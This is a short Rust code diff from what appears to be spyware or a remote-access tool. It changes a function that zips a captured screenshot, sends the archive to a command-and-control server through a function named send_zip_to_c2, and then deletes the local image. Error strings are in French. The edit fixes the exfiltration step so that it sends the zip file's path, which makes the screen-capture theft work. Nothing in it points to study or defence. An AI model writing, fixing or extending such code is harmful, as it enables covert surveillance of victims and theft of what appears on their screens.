@@ -47,15 +47,10 @@ pub async fn take_screenshot() {
 }
 
 async fn process_screenshot(png_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
-    zip_file(png_path).await?;
+    let zip_file = zip_file(png_path).await?;
+    let zip_path = zip_file.path();
 
-    if let Some(path_str) = png_path.to_str() {
-        println!("Fichier créé : {:?}", path_str);
-    } else {
-        return Err("Chemin de fichier invalide".into());
-    }
-    
-    connexion::send_zip_to_c2(png_path.to_str().unwrap()).await?;
+    connexion::send_zip_to_c2(zip_path.to_str().ok_or("Chemin ZIP invalide")?).await?;
 
     std::fs::remove_file(png_path)?;
 
